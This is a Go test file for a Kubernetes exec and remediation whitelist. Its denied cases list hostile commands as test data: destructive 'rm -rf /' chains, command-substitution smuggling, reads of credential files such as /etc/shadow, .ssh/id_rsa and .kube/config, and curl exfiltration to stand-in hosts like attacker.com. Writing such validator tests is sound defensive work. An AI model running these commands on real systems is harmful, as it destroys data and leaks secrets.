package kubernetes

import (
	"testing"
)

func defaultTestWhitelist() *Whitelist {
	return NewWhitelist(WhitelistConfig{
		ReadOnly:          []string{"get", "list", "describe", "logs"},
		Exec:              []string{"ls", "cat", "ps", "df"},
		Remediation:       []string{"kubectl rollout restart", "kubectl scale"},
		BlockedNamespaces: []string{"kube-system", "kube-public"},
	})
}

func TestIsReadOnlyAllowed(t *testing.T) {
	w := defaultTestWhitelist()

	allowed := []string{"get", "list", "describe", "logs", "GET", "LIST"}
	for _, v := range allowed {
		if !w.IsReadOnlyAllowed(v) {
			t.Errorf("expected %q to be read-only allowed", v)
		}
	}

	denied := []string{"delete", "patch", "apply", "exec"}
	for _, v := range denied {
		if w.IsReadOnlyAllowed(v) {
			t.Errorf("expected %q to be read-only denied", v)
		}
	}
}

func TestIsExecAllowed(t *testing.T) {
	w := defaultTestWhitelist()

	if !w.IsExecAllowed("ls -la /tmp") {
		t.Error("expected 'ls -la /tmp' to be exec-allowed")
	}
	if !w.IsExecAllowed("ps aux") {
		t.Error("expected 'ps aux' to be exec-allowed")
	}
	if w.IsExecAllowed("rm -rf /") {
		t.Error("expected 'rm -rf /' to be exec-denied")
	}
	if w.IsExecAllowed("") {
		t.Error("expected empty string to be exec-denied")
	}
}

func TestIsRemediationAllowed(t *testing.T) {
	w := defaultTestWhitelist()

	if !w.IsRemediationAllowed("kubectl rollout restart deployment/myapp") {
		t.Error("expected rollout restart to be remediation-allowed")
	}
	if !w.IsRemediationAllowed("kubectl scale deployment myapp --replicas=3") {
		t.Error("expected scale to be remediation-allowed")
	}
	if w.IsRemediationAllowed("kubectl delete pod myapp-xxx") {
		t.Error("expected kubectl delete to be remediation-denied")
	}
}

func TestIsNamespaceBlocked(t *testing.T) {
	w := defaultTestWhitelist()

	if !w.IsNamespaceBlocked("kube-system") {
		t.Error("expected kube-system to be blocked")
	}
	if !w.IsNamespaceBlocked("kube-public") {
		t.Error("expected kube-public to be blocked")
	}
	if w.IsNamespaceBlocked("default") {
		t.Error("expected default to not be blocked")
	}
	if w.IsNamespaceBlocked("production") {
		t.Error("expected production to not be blocked")
	}
}

func TestIsExecAllowed_DangerousPatterns(t *testing.T) {
	w := defaultTestWhitelist()

	cases := []struct {
		cmd     string
		allowed bool
		desc    string
	}{
		{"ls $(whoami)", false, "command substitution $()"},
		{"ls `whoami`", false, "command substitution backtick"},
		{"ls | cat /etc/passwd", false, "pipe operator"},
		{"ls >> /tmp/out", false, "append redirect >>"},
		{"ls << EOF", false, "heredoc <<"},
		{"ls ; rm -rf /", false, "semicolon chaining"},
		{"ls && rm -rf /", false, "logical AND &&"},
		{"ls || rm -rf /", false, "logical OR ||"},
		{"cat /etc/shadow", false, "sensitive path /etc/shadow"},
		{"cat /etc/passwd", false, "sensitive path /etc/passwd"},
		{"cat /proc/self/environ", false, "sensitive path /proc/self/environ"},
		{"cat /proc/self/cmdline", false, "sensitive path /proc/self/cmdline"},
		{"ls /.ssh/id_rsa", false, "sensitive path .ssh"},
		{"cat /.kube/config", false, "sensitive path .kube/config"},
		{"cat /.env", false, "sensitive path .env"},
		{"ls /var/run/secrets", false, "sensitive path /var/run/secrets"},
		{"ls -la /tmp", true, "safe ls command"},
		{"ps aux", true, "safe ps command"},
	}

	for _, tc := range cases {
		got := w.IsExecAllowed(tc.cmd)
		if got != tc.allowed {
			t.Errorf("[%s] IsExecAllowed(%q) = %v, want %v", tc.desc, tc.cmd, got, tc.allowed)
		}
	}
}

func TestIsExecAllowed_CurlURLFiltering(t *testing.T) {
	w := NewWhitelist(WhitelistConfig{
		Exec: []string{"curl"},
	})

	cases := []struct {
		cmd     string
		allowed bool
		desc    string
	}{
		{"curl http://attacker.com/exfil", false, "external HTTP URL"},
		{"curl https://evil.io/steal", false, "external HTTPS URL"},
		{"curl http://localhost:8080/metrics", true, "localhost URL"},
		{"curl http://127.0.0.1:9090/api", true, "127.0.0.1 URL"},
		{"curl http://prometheus.monitoring.svc.cluster.local/api", true, "cluster-local service URL"},
		{"curl http://svc.cluster.local/health", true, ".svc.cluster. URL"},
		{"curl -s http://myservice.local/ready", true, ".local/ URL"},
		{"curl -v", true, "no URL argument"},
	}

	for _, tc := range cases {
		got := w.IsExecAllowed(tc.cmd)
		if got != tc.allowed {
			t.Errorf("[%s] IsExecAllowed(%q) = %v, want %v", tc.desc, tc.cmd, got, tc.allowed)
		}
	}
}

func TestValidateExecCommand_FullArgInspection(t *testing.T) {
	w := defaultTestWhitelist()

	// Dangerous argument in slice form must also be caught.
	allowed, reason := w.ValidateExecCommand([]string{"ls", "$(whoami)"})
	if allowed {
		t.Errorf("expected command substitution in args to be denied")
	}
	if reason == "" {
		t.Error("expected a deny reason")
	}

	allowed, _ = w.ValidateExecCommand([]string{"cat", "/etc/passwd"})
	if allowed {
		t.Error("expected sensitive path in args to be denied")
	}
}

func TestValidateExecCommand(t *testing.T) {
	w := defaultTestWhitelist()

	allowed, reason := w.ValidateExecCommand([]string{"ls", "-la"})
	if !allowed {
		t.Errorf("expected ls to be allowed, got reason: %s", reason)
	}

	allowed, reason = w.ValidateExecCommand([]string{"rm", "-rf", "/"})
	if allowed {
		t.Errorf("expected rm to be denied")
	}
	if reason == "" {
		t.Error("expected a deny reason")
	}

	allowed, reason = w.ValidateExecCommand([]string{})
	if allowed {
		t.Error("expected empty command to be denied")
	}
	if reason != "empty command" {
		t.Errorf("expected 'empty command' reason, got: %s", reason)
	}
}
